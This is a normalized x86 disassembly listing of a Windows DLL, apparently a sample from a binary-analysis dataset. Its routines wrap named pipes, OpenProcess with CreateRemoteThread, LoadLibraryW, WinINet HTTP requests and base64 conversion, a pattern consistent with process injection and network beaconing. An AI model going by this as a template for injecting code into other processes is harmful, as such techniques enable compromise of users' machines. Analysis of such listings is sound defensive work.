test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10023a01
sub_100132ab
push esi
lea esi [ ecx + 0x4 ]
mov eax [ esi ]
test eax eax
jne r-xdata
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
push [ esi ]
call [ CloseHandle@IAT ]
sub_100132cc
push 0x2c
mov eax sub_10049ab0
call sub_10023e33
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
xor ebx ebx
push esi
push sub_1001335a
push ebx
push ebx
call [ CreateThread@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x14 ] eax
call sub_10001d1f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x38 ]
push eax
sete al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_100023ce
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
call sub_1001150b
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov [ esi ] r--data
mov [ esi + 0x10 ] bl
mov [ esi + 0x11 ] bl
mov [ esi + 0x14 ] ebx
mov eax esi
call sub_10023f0b
retn 0x8
sub_1001336c
push 0x8
push r--data
call sub_10028b48
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] 0x1
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
jmp sub_100133bf
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ esi + 0x14 ] eax
jmp sub_100133bf
sub_100133ce
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov al 0x1
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push 0x1
push eax
call [ WaitNamedPipeW@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
xor al al
jmp r-xdata
cmp eax 0x79
jne r-xdata
call sub_10023f0b
retn
sub_10013449
push 0x38
mov eax sub_10049a8d
call sub_10023e33
mov eax [ ebp + 0xc ]
xor edi edi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] edi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
lea ecx [ edi + 0x4 ]
mov [ edi ] esi
call sub_100137e2
push esi
push esi
push edi
call sub_100289c4
add esp 0xc
mov eax edi
call sub_10023f0b
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ CreateNamedPipeW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_100023ce
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001d1f
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x44 ]
call sub_100023ce
push 0x8
call sub_10020186
pop ecx
cmp eax esi
je r-xdata
sub_1001352e
push 0x20
mov eax sub_100498f5
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0x0
push eax
call [ ConnectNamedPipe@IAT ]
mov esi eax
cmp esi 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call [ GetLastError@IAT ]
cmp eax 0x217
je r-xdata
call sub_10023f0b
retn 0x4
sub_10013597
push 0x4
mov eax sub_1004a281
call sub_10023e33
mov edi ecx
and [ ebp - 0x10 ] 0x0
push 0x8
call sub_10020186
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_100137e2
push esi
push esi
push ebx
call sub_100289c4
add esp 0xc
mov eax ebx
call sub_10023f0b
retn
push edi
call sub_1001383f
mov [ esi ] r--data
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
jmp r-xdata
sub_10013608
push 0xc
mov eax sub_1004a25c
call sub_10023e33
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_100020c6
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax 0x200
lea esi [ edi + 0x3c ]
mov [ edi + 0x20 ] 0x3
mov [ edi + 0x24 ] ebx
mov [ edi + 0x28 ] 0xff
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] ebx
mov [ edi + 0x38 ] ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_10013777
mov [ ebp - 0x4 ] 0x2
call sub_100137aa
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
je r-xdata
mov eax edi
call sub_10023f0b
retn 0x8
call sub_1000ad5c
sub_100136a5
push 0x4
mov eax sub_10048c1b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x40 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_10002597
call sub_10023f0b
retn
call sub_1000ad5c
sub_100136de
push 0xc
mov eax sub_1004a223
call sub_10023e33
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
add ebx 0x3c
mov eax [ ebx ]
mov [ edi ] eax
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000ad88
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ edi ] 0x0
mov [ ebp - 0x10 ] esi
jne r-xdata
push [ edi ]
call sub_1001352e
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10013777
mov esi ebx
mov [ ebp - 0x4 ] 0x2
call sub_100137aa
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10013777
mov [ ebp - 0x4 ] esi
mov esi edi
call sub_100137aa
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax edi
call sub_10023f0b
retn 0x8
call sub_1000ad5c
call sub_1000ad5c
sub_10013777
push ebp
mov ebp esp
push ecx
push [ eax + 0x38 ]
and [ ebp - 0x4 ] 0x0
push [ eax + 0x34 ]
add eax 0x4
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ eax + 0x24 ]
push [ eax + 0x20 ]
push [ eax + 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_10013449
mov eax [ ebp + 0x8 ]
add esp 0x24
leave
retn 0x4
sub_100137aa
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x8 ] ecx
push eax
lea ecx [ ebp - 0x4 ]
call sub_1000ad88
lea eax [ ebp - 0x8 ]
cmp eax esi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax esi
leave
retn
call sub_1000ad5c
sub_100137e2
push 0x4
mov eax sub_10048879
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001383f
push 0x40
mov eax sub_10049a62
call sub_10023e33
xor edi edi
push edi
push edi
push 0x3
push edi
push edi
push 0x3
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] eax
call sub_10001d1f
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x2c ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push esi
lea ecx [ ebp - 0x48 ]
call sub_10001d1f
cmp [ ebp - 0x10 ] 0xffffffff
lea eax [ ebp - 0x48 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001147a
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x10 ]
call sub_10023f0b
retn
sub_100138d0
push 0x64
mov eax sub_1004a1df
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ WriteFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_10023f0b
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001d1f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10023a01
sub_1001396c
push 0x64
mov eax sub_1004a1b3
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
push eax
call [ ReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
setne al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
cmp [ ebp - 0x10 ] esi
je r-xdata
call sub_10023f0b
retn 0x8
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001d1f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001d6b
push r--data
lea eax [ ebp - 0x70 ]
push eax
call sub_10023a01
sub_10013a52
push 0x4c
mov eax sub_10049a37
call sub_10023e33
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] ebx
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x14 ] ebx
jb r-xdata
add eax 0x4
mov [ ebp - 0x10 ] eax
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
jmp r-xdata
xor edi edi
push ebx
push [ ebp - 0x14 ]
lea ecx [ edi + 0x4 ]
call sub_10005ad1
mov [ edi ] r--data
jmp r-xdata
push ebx
push ebx
lea edx [ ebp - 0x14 ]
push edx
push ebx
xor edi edi
inc edi
push edi
push ecx
push eax
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10001d1f
lea eax [ ebp - 0x38 ]
push eax
cmp esi edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] bl
call sub_100023ce
push 0x20
call sub_10020186
mov edi eax
pop ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0x2
cmp edi ebx
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
mov esi [ ebp + 0x8 ]
call sub_10011d7a
mov [ ebp - 0x4 ] ebx
xor edi edi
mov eax esi
mov eax [ eax ]
inc edi
cmp [ eax + 0x1c ] 0x10
mov [ ebp - 0x18 ] edi
jb r-xdata
push ebx
push ebx
lea esi [ ebp - 0x14 ]
push esi
push eax
push edi
push edx
push ecx
call [ CryptStringToBinaryA@IAT ]
push r--data
lea ecx [ ebp - 0x54 ]
mov esi eax
call sub_10001d1f
lea eax [ ebp - 0x54 ]
push eax
cmp esi edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001147a
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x54 ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
mov ecx [ ecx ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
cmp [ ecx + 0x18 ] 0x10
mov ecx [ ebp - 0x10 ]
jb r-xdata
sub_10013b7d
push 0x68
mov eax sub_100499df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi ecx
xor edx edx
cmp [ esi + 0x1c ] 0x10
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] edx
jb r-xdata
lea ecx [ esi + 0x8 ]
mov ecx [ esi + 0x8 ]
jmp r-xdata
cmp [ esi + 0x1c ] 0x10
mov eax [ esi + 0x18 ]
jb r-xdata
lea ecx [ ebp - 0x28 ]
lea edi [ ebp - 0x30 ]
push edi
mov edi [ CryptBinaryToStringA@IAT ]
push edx
xor ebx ebx
inc ebx
push ebx
push eax
push ecx
call edi
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] ebx
lea eax [ ebp - 0x54 ]
push eax
setne al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x54 ]
call sub_100023ce
push 0x0
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
jae r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
dec ecx
push ecx
mov ecx [ ebp - 0x38 ]
push eax
call sub_10010f73
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x38 ]
call sub_10023f1f
retn
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0x30 ]
push edx
push ecx
push ebx
push eax
push esi
call edi
push r--data
lea ecx [ ebp - 0x70 ]
mov esi eax
call sub_10001d1f
lea eax [ ebp - 0x70 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001147a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] bl
call sub_100023ce
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
sub_10013c8f
push 0x30
mov eax sub_100499ac
call sub_10023e33
lea eax [ ebp - 0x14 ]
push eax
xor esi esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push esi
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_10001d1f
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_100023ce
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_1001150b
mov [ edi ] r--data
mov eax edi
call sub_10023f0b
retn 0xc
sub_10013d0f
push 0x20
mov eax sub_10049989
call sub_10023e33
push [ ebp + 0x8 ]
xor esi esi
push esi
push 0x2a
mov [ ebp - 0x10 ] esi
call [ OpenProcess@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_10001d1f
lea eax [ ebp - 0x2c ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push 0x8
call sub_10020186
pop ecx
cmp eax esi
je r-xdata
push esi
lea ecx [ ebx + 0x4 ]
mov [ ebx ] esi
call sub_10013d9c
push esi
push esi
push ebx
call sub_100289c4
add esp 0xc
mov eax ebx
call sub_10023f0b
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
sub_10013d9c
push 0x4
mov eax sub_1004885e
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_10013e07
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ LoadLibraryW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test edi edi
sete al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
mov eax esi
call sub_10023f0b
retn 0x4
sub_10013e8d
push 0x20
mov eax sub_10049966
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
call sub_10023f0b
retn
push eax
call [ FreeLibrary@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov ebx eax
call sub_10001d1f
lea eax [ ebp - 0x2c ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
and [ esi + 0x4 ] 0x0
sub_10013f1b
push 0x20
mov eax sub_100498f5
call sub_10023e33
mov edi ecx
mov esi edx
call sub_100142ce
mov esi [ ebp + 0x8 ]
mov ebx eax
call sub_100142ce
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
xor esi esi
push esi
push eax
push ebx
push esi
push edi
call [ InternetOpenW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001147a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov eax edi
call sub_10023f0b
retn
sub_10013fc6
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov edi ecx
mov esi edx
call sub_100142ce
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_100142ce
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push 0x3
push eax
push ebx
push 0x50
push edi
push ecx
call [ InternetConnectW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001147a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov eax edi
call sub_10023f0b
retn
sub_10014071
push 0x24
mov eax sub_10049918
call sub_10023e33
mov edi ecx
mov esi edx
call sub_100142ce
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_100142ce
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_100142ce
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_100142ce
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push edi
push ebx
push ecx
call [ HttpOpenRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001d1f
lea eax [ ebp - 0x30 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_1001147a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
mov eax edi
call sub_10023f0b
retn
sub_10014107
push 0x20
mov eax sub_100498f5
call sub_10023e33
mov esi ecx
call sub_100142ce
push [ ebp + 0x10 ]
mov esi [ esi + 0x14 ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push esi
push eax
push ecx
call [ HttpSendRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn 0xc
sub_1001416e
push 0x20
mov eax sub_10049989
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ InternetReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x10 ]
call sub_10023f0b
retn 0xc
sub_100141d4
push 0x28
mov eax sub_1004a188
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20000013
push eax
mov [ ebp - 0x14 ] 0x4
call [ HttpQueryInfoW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
mov eax [ ebp - 0x10 ]
call sub_10023f0b
retn 0x4
sub_10014246
push 0x48
mov eax sub_10048fa8
call sub_10023e33
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
test ecx ecx
jne r-xdata
call sub_10023f0b
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10023a01
sub_100142ed
push 0x1c
mov eax sub_1004993b
call sub_10023e33
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
call [ InternetQueryOptionW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn 0x10
sub_1001434a
push 0x1c
mov eax sub_1004993b
call sub_10023e33
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
call [ InternetSetOptionW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn 0x10
sub_100143a7
push r--data
push [ esp + 0x8 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x10
cmp [ esp + 0x4 ] 0x3ef
jne r-xdata
push 0x3
call sub_10023978
int3
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
sub_10014410
or [ esi + 0x260 ] 0xffffffff
xor ecx ecx
push 0x100
lea eax [ esi + 0x58 ]
push ecx
push eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] ecx
mov [ esi + 0x50 ] ecx
call sub_100209e0
add esp 0xc
inc [ esi + 0x26c ]
retn
sub_10014450
push ebx
xor ebx ebx
push esi
cmp edi ebx
je r-xdata
push 0xfffffffe
cmp [ edi + 0x24 ] ebx
jne r-xdata
cmp [ edi + 0x28 ] ebx
jne r-xdata
mov [ edi + 0x24 ] sub_100143ed
push 0x1
push 0xd9b0
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov esi eax
add esp 0xc
cmp esi ebx
jne r-xdata
mov [ edi + 0x28 ] sub_100143fe
push 0x1
mov [ esi ] edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
